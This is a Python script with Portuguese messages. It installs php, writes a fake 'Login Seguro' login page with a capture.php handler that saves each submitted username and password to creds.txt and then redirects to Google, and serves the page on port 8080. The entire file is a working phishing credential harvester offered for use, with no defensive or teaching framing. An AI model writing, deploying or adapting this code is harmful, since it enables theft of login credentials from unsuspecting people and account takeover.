import os
import sys
import shutil
import subprocess
from http.server import SimpleHTTPRequestHandler, HTTPServer

def check_dependencies():
    print("[+] Verificando dependências...")
    required_tools = ["php", "wget"]
    for tool in required_tools:
        if not shutil.which(tool):
            print(f"[!] {tool} não encontrado. Instalando...")
            install_dependency(tool)

def install_dependency(tool):
    try:
        if shutil.which("apt"):  # Debian-based
            subprocess.run(["sudo", "apt", "install", "-y", tool], check=True)
        elif shutil.which("pacman"):  # Arch-based
            subprocess.run(["sudo", "pacman", "-S", "--noconfirm", tool], check=True)
        elif shutil.which("pkg"):  # Termux
            subprocess.run(["pkg", "install", "-y", tool], check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Erro ao instalar {tool}. Tente instalar manualmente.")

def create_phishing_page():
    print("[+] Criando página de phishing...")
    if not os.path.exists("phishing"):  
        os.mkdir("phishing")
    index_html = """
    <html>
    <head>
        <title>Login Seguro</title>
    </head>
    <body>
        <h2>Insira suas credenciais</h2>
        <form action='capture.php' method='POST'>
            <input type='text' name='username' placeholder='Usuário' required><br>
            <input type='password' name='password' placeholder='Senha' required><br>
            <input type='submit' value='Login'>
        </form>
    </body>
    </html>
    """
    capture_php = """
    <?php
    $file = fopen("creds.txt", "a");
    fwrite($file, "Usuário: " . $_POST['username'] . "\nSenha: " . $_POST['password'] . "\n\n");
    fclose($file);
    header('Location: https://www.google.com');
    ?>
    """
    with open("phishing/index.html", "w") as f:
        f.write(index_html)
    with open("phishing/capture.php", "w") as f:
        f.write(capture_php)
    print("[+] Página de phishing criada com sucesso!")

def start_server():
    print("[+] Iniciando servidor de phishing...")
    os.chdir("phishing")
    subprocess.run(["php", "-S", "0.0.0.0:8080"], check=True)

def main():
    check_dependencies()
    create_phishing_page()
    start_server()

if __name__ == "__main__":
    main()
